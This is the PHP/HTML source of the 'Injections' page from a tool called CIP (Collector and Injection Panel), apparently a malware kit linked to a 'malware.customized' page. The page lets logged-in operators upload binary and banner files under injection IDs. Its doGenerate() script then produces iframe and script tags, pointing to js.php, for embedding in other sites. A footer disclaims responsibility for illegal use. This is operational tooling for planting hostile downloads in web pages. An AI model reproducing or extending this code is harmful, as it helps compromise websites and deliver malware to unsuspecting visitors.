<?php 
	
	session_start();	
	
	require_once ("header.php");
	
	$failedGoTo = "home.php";
	$successGoTo = "injections.php";
	$logoutGoTo = "home.php";

	$access = new Access;
	$logonUser = $access->isInitAccess();
	if($logonUser) $typeUser = $access->isAdminUser();
	$access->processLogout($logoutGoTo);
	$access->processLogonRestriction($failedGoTo);
	$access->processSendAccess($successGoTo, $failedGoTo);
	unset($access);
	
	$injectionsArray = array();
	$injections = new Injecions;
	$injectionsArray = $injections->getInjections();
	$injections->processAddInjection($successGoTo, $failedGoTo);
	$injections->processModifyInjection($successGoTo, $failedGoTo);
	$injections->processRemoveInjection($successGoTo, $failedGoTo);	
	unset($injections);
	
?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><!-- InstanceBegin template="/Templates/Main.dwt.php" codeOutsideHTMLIsLocked="false" -->
<head> 
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<!-- InstanceBeginEditable name="doctitle" -->
<title>CIP (Collector and Injection Panel)</title>
<!-- InstanceEndEditable -->
<!-- InstanceBeginEditable name="head" -->
<script src="../SpryAssets/SpryCollapsiblePanel.js" type="text/javascript"></script>
<link href="../SpryAssets/SpryCollapsiblePanel.css" rel="stylesheet" type="text/css">
<?php if(count($injectionsArray)>0){ ?>
<script type="text/javascript">

	function findObj(theObj, theDoc){
		  var p, i, foundObj;
		  
		  if(!theDoc) theDoc = document;
		  if( (p = theObj.indexOf("?")) > 0 && parent.frames.length)  {
			theDoc = parent.frames[theObj.substring(p+1)].document;
			theObj = theObj.substring(0,p);
		  }
		  if(!(foundObj = theDoc[theObj]) && theDoc.all) foundObj = theDoc.all[theObj];
		  for (i=0; !foundObj && i < theDoc.forms.length; i++) 
			foundObj = theDoc.forms[i][theObj];
		  for(i=0; !foundObj && theDoc.layers && i < theDoc.layers.length; i++) 
			foundObj = findObj(theObj,theDoc.layers[i].document);
		  if(!foundObj && document.getElementById) foundObj = document.getElementById(theObj);
		  
		  return foundObj;
	}

	function doGenerate(){
		var lnk = findObj("link");
		var iframe = findObj("iframe");
		var script = findObj("script");
		var selector = findObj("selector");
		var id = selector.options[selector.selectedIndex].value;
		
                var url = location.href.toString();  
                url = url.replace("injections.php", "");
		
		iframe.value = "<iframe src=\"" + url + "js.php?type=html&id=" + id + "\"></iframe>";		
		script.value = "<script type=\"text/javascript\" src=\"" + url + "js.php?id=" + id + "\">";
		lnk.href = url + "js.php?type=html&id=" + id;
		lnk.target = "_blank";
	}

</script>
<?php } ?>

<!-- InstanceEndEditable -->
<style type="text/css">
<!--
body,td,th {
	font-family: Arial, Helvetica, sans-serif;
	color: #FFFFFF;
}
body {
	background-color: #333333;
	margin-left: 0px;
	margin-top: 20px;
	margin-right: 0px;
	margin-bottom: 0px;
}
a {
	font-size: x-small;
	color: #CCCCCC;
}
a:link {
	text-decoration: underline;
	color: #000000;
}
a:visited {
	text-decoration: underline;
	color: #000000;
}
a:hover {
	text-decoration: none;
	color: #000000;
}
a:active {
	text-decoration: underline;
	color: #000000;
}
-->
</style>
<link href="../SpryAssets/script.css" rel="stylesheet" type="text/css">
</head>

<body>
<table width="100" border="0" align="center" cellpadding="0" cellspacing="0">
  <tr>
    <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
      <tr>
        <td><div align="center"><a href="http://www.facebook.com/malware.customized" target="_blank"><img src="../img/banner062.jpg" alt="Banner" width="728" height="90" border="0"></a><br>
        </div></td>
      </tr>
      <tr>
        <td class="black">&nbsp;</td>
      </tr>
      <tr>
        <td><table width="100%" border="0" cellspacing="0" cellpadding="0">
          <tr>
            <td width="10" align="left" valign="top"><table width="50%" border="0" cellspacing="0" cellpadding="0">
              <!-- LOGIN OFF HEADER -->
              <?php if(!$logonUser){ ?>
              <tr>
                <td align="left" valign="top"><table width="100%" height="5" border="0" cellpadding="0" cellspacing="0" class="blackBorder">
                    <tr>
                      <td height="25" align="center" valign="middle" bgcolor="#000000"><div align="center" class="white"><strong>LOGIN </strong></div></td>
                    </tr>
                    <tr>
                      <td align="left" valign="top" class="black"><form action="<?php echo "home.php"; ?>" method="post" name="access" id="access">
                          <table width="100"  border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#666666">
                            <tr>
                              <td nowrap="nowrap" class="black">&nbsp;<br />
                                  <strong>&nbsp;Username:</strong></td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black"><input autocomplete="off" name="user" type="text" class="inputText" id="user" size="15" maxlength="30" />
                                  <input autocomplete="off" name="sendSession" type="hidden" id="sendSession" value="true" /></td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black"><strong>&nbsp;Password:</strong></td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black"><input autocomplete="off" name="pass" type="password" class="inputText" id="pass" size="15" maxlength="30" onmouseover="ddrivetip('En este deberas ingresar tu contraseña. (es modificable)', 190)" onmouseout="hideddrivetip()" />
                                  <br />
                              </td>
                            </tr>
                            <tr>
                              <td nowrap="nowrap" class="black">&nbsp;</td>
                            </tr>
                            <tr>
                              <td valign="middle" class="black"><div align="center">
                                  <input name="Button2" type="submit" class="inputText" onmouseover="ddrivetip('Presiona este botón para iniciar sessión.', 140)" onmouseout="hideddrivetip()" value="Send" />
                                  <br />
                                  <br />
                              </div></td>
                            </tr>
                          </table>
                      </form></td>
                    </tr>
                </table></td>
              </tr>
              <?php } ?>
              <!-- LOGIN ON HEADER -->
              <?php if($logonUser){ ?>
              <tr>
                <td><table width="100%" height="5" border="0" cellpadding="0" cellspacing="0" class="blackBorder">
                    <tr>
                      <td height="25" align="center" valign="middle" bgcolor="#000000"><div align="center" class="white"><strong>OPTIONS </strong></div></td>
                    </tr>
                    <tr>
                      <td class="black"><table width="100"  border="0" align="center" cellpadding="0" cellspacing="0" bgcolor="#666666">
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;</td>
                          </tr>
                          <?php if($typeUser == 1) { ?>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/users.php"; ?>"><strong>Users</strong></a></td>
                          </tr>
                          <?php } ?>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/collections.php"; ?>"><strong>Collections</strong></a>&nbsp;</td>
                          </tr>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/injections.php"; ?>"><strong>Injections</strong></a></td>
                          </tr>
                          <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/downloads.php"; ?>"><strong>Downloads</strong></a></td>
                          </tr>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;&laquo;&nbsp;<a href="<?php echo "../doc/home.php?logout=true"; ?>" class="black"><strong>Logout</strong></a></td>
                          </tr>
                          <tr>
                            <td nowrap="nowrap" class="black">&nbsp;</td>
                          </tr>
                      </table></td>
                    </tr>
                </table></td>
              </tr>
              <?php } ?>
              <!-- END LOGIN HEADER -->
            </table></td>
            <td width="100%" align="right" valign="top"><!-- InstanceBeginEditable name="EditRegion3" -->
              <table width="99%" border="0" align="right" cellpadding="0" cellspacing="0" class="blackBorder">
                <tr>
                  <td height="25" align="center" valign="middle" bgcolor="#000000"><div align="center" class="white"><strong>CONFIG INJECTIONS</strong></div></td>
                </tr>
                <tr>
                  <td align="center" valign="top" bgcolor="#666666"><br>
                    <table width="100" border="0" cellspacing="0" cellpadding="0">
                    	<?php if(count($injectionsArray)>=0){ ?>
                      <tr>
                        <td><div id="CollapsiblePanel1" class="CollapsiblePanel">
                          <div class="CollapsiblePanelTab" tabindex="0">
                            <div align="center">Add Injection</div>
                          </div>
                          <div class="CollapsiblePanelContent">
                          <form enctype="multipart/form-data" action="<?php echo "injections.php"; ?>" method="post" name="sender" id="sender">
                            <table width="100" border="0" align="center" cellpadding="0" cellspacing="0">
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;ID:&nbsp;</td>
                                <td><input name="id" type="text" class="inputSelect" id="id"></td>
                              </tr>                              
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;Banner File:&nbsp;</td>
                                <td><input name="bannerFile" type="file" class="inputFile" id="bannerFile" ></td>
                              </tr>
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;Binary File:&nbsp;</td>
                                <td>
                                	<input name="binaryFile" type="file" class="inputFile" id="binaryFile" >
                                    <input type="hidden" name="addInjection" value="true" />
                                </td>
                              </tr>                              
                              <tr>
                                <td colspan="2" align="center" valign="middle"><br>
                                    <label>
                                    <div align="center">
                                      <input type="submit" class="inputText" value="Send">
                                    </div>
                                  </label>
                                    <br></td>
                              </tr>
                            </table>
                            
                            </form>
                            </div>
                        </div></td>
                      </tr>
                      <?php } ?>
                      <?php if(count($injectionsArray)>0){ ?>
                      <tr>
                        <td>&nbsp;</td>
                      </tr>
                      <tr>
                        <td><div id="CollapsiblePanel2" class="CollapsiblePanel">
                          <div class="CollapsiblePanelTab" tabindex="0">
                            <div align="center">Modify Injection</div>
                          </div>
                          <div class="CollapsiblePanelContent">
                            <form enctype="multipart/form-data" action="<?php echo "injections.php"; ?>" method="post" name="sender" id="sender2">
                              <table width="100" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;ID:&nbsp;</td>
                                  <td><select name="id" class="inputSelect" id="id">
                                    <?php
								if(isset($injectionsArray) && count($injectionsArray) > 0){
									for($i=0; $i < count($injectionsArray); $i++){
										echo "<option value=\"".$injectionsArray[$i]."\">".$injectionsArray[$i]."</option>";
											
									}
								}
								?>
                                  </select></td>
                                </tr>
                                <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;Banner File:&nbsp;</td>
                                <td><input name="bannerFile" type="file" class="inputFile" id="bannerFile" ></td>
                              </tr>
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;Binary File:&nbsp;</td>
                                <td>
                                	<input name="binaryFile" type="file" class="inputFile" id="binaryFile" >
                                    <input type="hidden" name="modifyInjection" value="true" />
                                </td>
                              </tr>
                                
                                <tr>
                                  <td colspan="2" align="center" valign="middle"><br>
                                      <label>
                                      <div align="center">
                                        <input type="submit" class="inputText" value="Send">
                                      </div>
                                    </label>
                                      <br></td>
                                </tr>
                              </table>
                            </form>
                          </div>
                        </div></td>
                      </tr>
                      <tr>
                        <td>&nbsp;</td>
                      </tr>
                      <tr>
                        <td nowrap><div id="CollapsiblePanel3" class="CollapsiblePanel">
                          <div class="CollapsiblePanelTab" tabindex="0">
                            <div align="center">&nbsp;Remove Injection&nbsp;</div>
                          </div>
                          <div class="CollapsiblePanelContent">
                            <form enctype="multipart/form-data" action="<?php echo "injections.php"; ?>" method="post" name="sender" id="sender3">
                              <table width="100" border="0" align="center" cellpadding="0" cellspacing="0">
                                <tr>
                                  <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;ID:&nbsp;</td>
                                  <td><select name="id" class="inputSelect" id="id">
                                      <?php
								if(isset($injectionsArray) && count($injectionsArray) > 0){
									for($i=0; $i < count($injectionsArray); $i++){
										echo "<option value=\"".$injectionsArray[$i]."\">".$injectionsArray[$i]."</option>";
											
									}
								}
								?>
                                  </select>
                                    <input name="removeInjection" type="hidden" id="removeInjection" value="true" /></td>
                                </tr>

                                <tr>
                                  <td colspan="2" align="center" valign="middle"><br>
                                      <label>
                                      <div align="center">
                                        <input type="submit" class="inputText" value="Send">
                                      </div>
                                    </label>
                                      <br></td>
                                </tr>
                              </table>
                            </form>
                          </div>
                        </div></td>
                      </tr>
                      <?php if(count($injectionsArray)>0){ ?>
                      <tr>
                        <td nowrap>&nbsp;</td>
                      </tr>
                      <tr>
                        <td nowrap><div id="CollapsiblePanel4" class="CollapsiblePanel">
                          <div class="CollapsiblePanelTab" tabindex="0">
                          <div align="center">&nbsp;Generate Code&nbsp;</div>
                          </div>
                          <div class="CollapsiblePanelContent">
                            <table width="100%" border="0" align="center" cellpadding="0" cellspacing="0">
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;ID:&nbsp;</td>
                                <td><select name="selector" class="inputSelect" id="selector">
                                  <?php
								if(isset($injectionsArray) && count($injectionsArray) > 0){
									for($i=0; $i < count($injectionsArray); $i++){
										echo "<option value=\"".$injectionsArray[$i]."\">".$injectionsArray[$i]."</option>";
											
									}
								}
								?>
                                </select></td>
                              </tr>
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;IFRAME:&nbsp;</td>
                                <td><input name="iframe" type="text" class="inputSelect" id="iframe" size="40" readonly></td>
                              </tr>
                              <tr>
                                <td align="right" nowrap bgcolor="#000000" class="white">&nbsp;SCRIPT:&nbsp;</td>
                                <td><input name="script" type="text" class="inputSelect" id="script" size="40" readonly></td>
                              </tr>
                              <tr>
                                <td colspan="2" align="center" valign="middle"><a href="" id="link" name="link">Launch Injection</a><br><br><br>
                                  <label>
                                  <div align="center">
                                    <input name="Button" type="button" class="inputText" value="Generate" onClick="doGenerate()">
                                  </div>
                                  </label>
                                  <br></td>
                              </tr>
                            </table>
                          </div>
                        </div></td>
                      </tr>
                      <?php } ?>
                      <?php } ?>                      
                    </table>
                    <br></td>
                </tr>
              </table>
              <script type="text/javascript">
<!--
var CollapsiblePanel1 = new Spry.Widget.CollapsiblePanel("CollapsiblePanel1", {enableAnimation:false, contentIsOpen:false});
var CollapsiblePanel2 = new Spry.Widget.CollapsiblePanel("CollapsiblePanel2", {enableAnimation:false, contentIsOpen:false});
var CollapsiblePanel3 = new Spry.Widget.CollapsiblePanel("CollapsiblePanel3", {enableAnimation:false, contentIsOpen:false});
var CollapsiblePanel4 = new Spry.Widget.CollapsiblePanel("CollapsiblePanel4", {contentIsOpen:false, enableAnimation:false});
//-->
              </script>
            <!-- InstanceEndEditable --></td>
          </tr>
        </table></td>
      </tr>
      <tr>
        <td>&nbsp;</td>
      </tr>
      <tr>
        <td><table width="100%" border="0" cellpadding="0" cellspacing="0" bgcolor="#666666" class="blackBorder">
          <tr>
            <td><div align="center">
              <p class="black">© 2011 CIP (Collector and Injection Panel) All rights reserved  | Developed by <a href="https://www.facebook.com/jheto.xekri" target="_blank">Jheto Xekri</a>.</p>
                <p class="black">Using this tool indicates that you have read and accept these terms, <br>
                  if you do not accept these terms, you not authorized to use this tool.<br>
                  <br>
                  This tool is provided only under user responsibility, the user assumes sole all <br>
                  responsibility                  for use wrong or illegal of this tool,  damage caused to third <br>
                  parties responsibility of the user, is not my responsibility the uses of this tool.</p>
</div></td>
          </tr>
        </table></td>
      </tr>
      
      
    </table></td>
  </tr>
</table>
</body>
<!-- InstanceEnd --></html>
